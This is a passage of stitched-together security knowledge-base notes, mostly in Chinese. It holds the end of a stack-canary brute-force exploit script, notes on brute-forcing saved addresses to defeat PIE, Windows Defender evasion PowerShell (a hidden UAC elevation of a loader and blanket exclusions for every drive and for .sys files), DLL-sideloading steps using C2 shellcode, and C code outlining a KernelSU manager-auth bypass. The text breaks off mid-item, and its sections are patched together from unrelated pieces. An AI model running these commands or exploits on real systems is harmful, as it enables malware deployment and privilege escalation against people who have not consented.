{test_canary.to_bytes(1, 'little')}", end="") # Send the current input size target.send(len_bytes_to_read.to_bytes(1, "little")) # Send this iterations canary target.send(b"0"*0x20 + known_canary + test_canary.to_bytes(1, "little")) # Scan in the output, determine if we have a correct value output = target.recvuntil(b"exit.") if b"YUM" in output: # If we have a correct value, record the canary value, reset the canary value, and move on print(" - next byte is: " + hex(test_canary)) known_canary = known_canary + test_canary.to_bytes(1, "little") len_bytes_to_read += 1 break # Return the canary return known_canary# Start the target processtarget = process('./feedme')#gdb.attach(target)# Brute force the canarycanary = breakCanary()log.info(f"The canary is: {canary}") # 工具与参考入口 https://guyinatuxedo.github.io/07-bof static/dcquals16 feedme/index.html # 检查清单 是否提取进程链 / 命令行 / 网络 / 文件 / 日志线索 是否区分攻击行为和正常管理行为 是否记录绕过假设与限制 是否形成检测规则或查询语句 # 关联 防御检测与 OPSEC 总览 知识地图 Pwn 基础链路 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/防御检测与OPSEC/BF Addresses in the Stack 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # BF Addresses in the Stack 技术笔记 [!summary] 提炼定位 面向 防御检测与 OPSEC 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 围绕 BF Addresses in the Stack 技术笔记 建立检测、规避、溯源或 OPSEC 检查。 把行为、进程链、网络、文件、日志事件转化为可验证线索。 # 中文提炼 核心目标是围绕 BF Addresses in the Stack 技术笔记 建立行为证据、检测逻辑和操作暴露面。 优先关注：BF Addresses in the Stack、Brute-Force Addresses、Improvements；把命令、进程、文件、网络、注册表 / 日志事件映射到检测字段。 区分正常管理行为与攻击行为，避免只按工具名告警；优先写可复现的查询条件。 OPSEC 记录应包括噪声来源、持久化痕迹、清理步骤和不可规避风险。 本页已沉淀 3 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 BF Addresses in the Stack Brute-Force Addresses Improvements # 核心要点 If you are facing a binary protected by a canary and PIE (Position Independent Executable) you probably need to find a way to 绕过 them. In order to 绕过 the PIE you need to leak some address. And if the binary is not leaking any addresses the best to do it is to brute-force the RBP and RIP saved in the stack in the vulnerable function.\ It's supposed that the return address inside the stack belongs to the main binary code, which, if the 漏洞 is located in the binary code, will usually be the case. If the target reads with gets/fgets-style functions, remember to remove terminators such as \n from the candidate alphabet. With read/recv, brute-forcing all byte values is usually fine. Blindly treating "no crash" as "correct byte" is fragile for saved RBP and saved RIP values. In practice, the following tweaks make this attack much more reliable: Do not brute-force bytes you already know: if disassembly shows that the target return site must end in a fixed tail such as ...e06, brute-force only the randomized byte or nibble(s). On amd64, the low 12 bits inside the page are constant for a given return site. # 命令 / 载荷 / 操作片段 # 1. Brute-Force Addresses 1INI_SHELLCODE = RBP - 1152 # 2. Brute-Force Addresses 123RET_OFFSET = 0x13cf # example: instruction after the call to the vulnerable functionelf.address = RIP - RET_OFFSETassert elf.address & 0xfff == 0 # 3. Brute-Force Addresses 1page_base = RIP - (RIP & 0xfff) # 检查清单 是否提取进程链 / 命令行 / 网络 / 文件 / 日志线索 是否区分攻击行为和正常管理行为 是否记录绕过假设与限制 是否形成检测规则或查询语句 # 关联 防御检测与 OPSEC 总览 知识地图 Pwn 基础链路 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

title: Antivirus (AV) 绕过
content: 来源路径： 02-知识点/防御检测与OPSEC/Antivirus (AV) 绕过.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Antivirus (AV) 绕过 [!summary] 提炼定位 面向 防御检测与 OPSEC 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 围绕 Antivirus (AV) 绕过 建立检测、规避、溯源或 OPSEC 检查。 把行为、进程链、网络、文件、日志事件转化为可验证线索。 # 中文提炼 核心目标是围绕 Antivirus (AV) 绕过 建立行为证据、检测逻辑和操作暴露面。 优先关注：Stop Defender、Installer-style UAC bait before tampering with Defender、Blanket MpPreference exclusions for every drive letter、AV 规避 方法论、Static 检测；把命令、进程、文件、网络、注册表 / 日志事件映射到检测字段。 区分正常管理行为与攻击行为，避免只按工具名告警；优先写可复现的查询条件。 OPSEC 记录应包括噪声来源、持久化痕迹、清理步骤和不可规避风险。 本页已沉淀 36 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Stop Defender Installer-style UAC bait before tampering with Defender Blanket MpPreference exclusions for every drive letter AV 规避 方法论 Static 检测 Dynamic analysis EXEs vs DLLs DLL Sideloading & Proxying Abusing Forwarded Exports (ForwardSideLoading) Freeze Direct/Indirect Syscalls & SSN Resolution (SysWhispers4) AMSI (Anti-Malware Scan Interface) Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook) PS Logging Obfuscation Deobfuscating ConfuserEx-Protected .NET Binaries One-liner SmartScreen & MoTW # 核心要点 Victims already believe they are installing “cracked” software, so the prompt is usually accepted, giving the malware the rights it needs to change Defender’s policy. The loop walks every mounted filesystem (D:, E:, USB sticks, etc.) so any future 载荷 dropped anywhere on disk is ignored. The .sys extension exclusion is forward-looking—attackers reserve the option to load unsigned drivers later without touching Defender again. Currently, AVs use different methods for checking if a file is malicious or not, static 检测，dynamic analysis, and for the more advanced EDRs, behavioural analysis. If you encrypt the binary, there will be no way for AV of detecting your program, but you will need some sort of loader to decrypt and run the program in memory. A good way for checking against Windows Defender static 检测 is ThreatCheck. It basically splits the file into multiple segments and then tasks Defender to scan each one individually, this way, it can tell you exactly what are the flagged strings or bytes in your binary. DLL Sideloading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious 载荷 (s) alongside each other. DLL Proxying forwards the calls a program makes from the proxy (and malicious) DLL to the original DLL, thus preserving the program's functionality and being able to handle the execution of your 载荷. Load TargetDll if not already loaded The loader then loads NCRYPTPROV.dll from C:\test and executes its DllMain If SetAuditingInterface is not implemented, you'll get a "missing API" error only after DllMain has already run You can enumerate forwarded exports with tooling such as: Enforce code integrity policies (WDAC/AppLocker) and deny write+execute in application directories FreshyCalls (VA sort): infer SSNs by sorting syscall stubs by virtual address instead of reading stub bytes. # 命令 / 载荷 / 操作片段 # 1. Installer-style UAC bait before tampering with Defender 1234if (-not (net session 2>$null)) { powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'" exit} # 2. Blanket MpPreference exclusions for every drive letter 1234$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }Add-MpPreference -ExclusionExtension '.sys' # 3. DLL Sideloading & Proxying 1234Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object { $binarytoCheck = "C:\Program Files\" + $_ C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck} # 4. DLL Sideloading & Proxying 12341. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)2. Generate some shellcode (I used Havoc C2)3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin) # 5. DLL Sideloading & Proxying 15. content: 来源路径： 02-知识点/防御检测与OPSEC/Android Rooting Frameworks (KernelSU-Magisk) Manager Auth 绕过 & Syscall Hook Abuse.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Android Rooting Frameworks (KernelSU-Magisk) Manager Auth 绕过 & Syscall Hook Abuse [!summary] 提炼定位 面向 防御检测与 OPSEC 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 围绕 Android Rooting Frameworks (KernelSU-Magisk) Manager Auth 绕过 & Syscall Hook Abuse 建立检测、规避、溯源或 OPSEC 检查。 把行为、进程链、网络、文件、日志事件转化为可验证线索。 # 中文提炼 核心目标是围绕 Android Rooting Frameworks (KernelSU-Magisk) Manager Auth 绕过 & Syscall Hook Abuse 建立行为证据、检测逻辑和操作暴露面。 优先关注：Android Rooting Frameworks (KernelSU/Magisk) Manager Auth 绕过 & Syscall Hook Abuse、Architecture pattern: syscall-hooked manager channel、KernelSU v0.5.7 认证 flow (as implemented)、漏洞 class: trusting “the first matching APK” from FD iteration、Attack preconditions；把命令、进程、文件、网络、注册表 / 日志事件映射到检测字段。 区分正常管理行为与攻击行为，避免只按工具名告警；优先写可复现的查询条件。 OPSEC 记录应包括噪声来源、持久化痕迹、清理步骤和不可规避风险。 本页已沉淀 2 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Android Rooting Frameworks (KernelSU/Magisk) Manager Auth 绕过 & Syscall Hook Abuse Architecture pattern: syscall-hooked manager channel KernelSU v0.5.7 认证 flow (as implemented) 漏洞 class: trusting “the first matching APK” from FD iteration Attack preconditions 利用 outline (KernelSU v0.5.7) 检测 and mitigation guidance Related notes across frameworks # 核心要点 This page abstracts the techniques and pitfalls uncovered in public research (notably Zimperium’s analysis of KernelSU v0.5.7) to help both red and blue teams understand attack surfaces, 利用 primitives, and robust mitigations. A userspace manager app authenticates first (e.g., CMD BECOME MANAGER). Once the kernel marks the caller as a trusted manager, privileged commands are accepted: APK signature check via FD table scan Parse APK v2 signature and verify against the official manager certificate. If all checks pass, the kernel caches the manager’s UID temporarily and accepts privileged commands from that UID until reset. This trust-by-indirection lets an unprivileged app impersonate the manager without owning the manager’s signing key. The FD scan does not bind to the caller’s package identity; it only pattern-matches path strings. open() returns the lowest available FD. By closing lower-numbered FDs first, an attacker can control ordering. The device is already rooted with a vulnerable rooting framework (e.g., KernelSU v0.5.7). The attacker can run arbitrary unprivileged code locally (Android app process). Resolve the caller’s package from its UID and verify against the installed package’s signature (via PackageManager) rather than scanning FDs. Detect presence of rooting frameworks and manager processes; monitor for prctl calls with suspicious magic constants (e.g., 0xDEADBEEF) if you have kernel telemetry. On managed fleets, block or alert on boot receivers from untrusted packages that rapidly attempt privileged manager commands post-boot. Only affects devices already rooted with a vulnerable framework. # 命令 / 载荷 / 操作片段 # 1. 利用 outline (KernelSU v0.5.7) 123456789#include <fcntl.h>#include <unistd.h>void preopen_legit_manager_lowfd(const char *legit_apk_path) { // Reuse stdin (fd 0) if possible so the next open() returns 0 close(0); int fd = open(legit_apk_path, O_RDONLY); (void)fd; // fd should now be 0 if available} # 2. 利用 outline (KernelSU v0.5.7) 1234567891011121314151617#include <sys/prctl.h>#include <stdint.h>#define KSU_MAGIC 0xDEADBEEF#define CMD_BECOME_MANAGER 0x100 // Placeholder; command IDs are framework-specificstatic inline long ksu_call(unsigned long cmd, unsigned long arg2, unsigned long arg3, unsigned long arg4) { return prctl(KSU_MAGIC, cmd, arg2, arg3, arg4);}int become_manager(const char *my_data_dir) { long result = -1; // arg2: command, arg3: pointer to data path (userspace->kernel copy), arg4: optional result ptr result = ksu_call(CMD_BECOME_MANAGER, (unsigned long)my_data_dir, 0, 0); return (int)result;} # 工具与参考入口 KernelSU v0.5.7 – core hook.c path checks (L193, L201) KernelSU v0.5.7 – manager.c FD iteration/signature check (L43+) KernelSU – apk sign.c APK v2 verification (main) KernelSU project APatch SKRoot MagiskEoP – CVE-2024-48336 KSU PoC demo video (Wistia) # 检查清单 是否提取进程链 / 命令行 / 网络 / 文件 / 日志线索 是否区分攻击行为和正常管理行为 是否记录绕过假设与限制 是否形成检测规则或查询语句 # 关联 防御检测与 OPSEC 总览 知识地图 侦察枚举流水线 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

It focuses on fast triage, common detections, and copy‑pasteable hooks/tactics to 绕过 them without repacking when possible.
